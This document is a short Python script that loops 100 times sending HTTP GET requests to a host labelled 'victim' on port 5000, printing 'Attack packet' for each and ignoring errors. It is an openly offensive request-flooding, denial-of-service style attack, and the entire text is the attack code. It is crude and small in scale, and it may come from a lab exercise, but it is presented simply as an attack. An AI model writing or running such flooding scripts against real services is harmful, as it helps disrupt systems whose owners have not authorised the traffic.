import requests

target = "http://victim:5000"

for i in range(100):
    try:
        requests.get(target)
        print(f"Attack packet {i}")
    except:
        pass
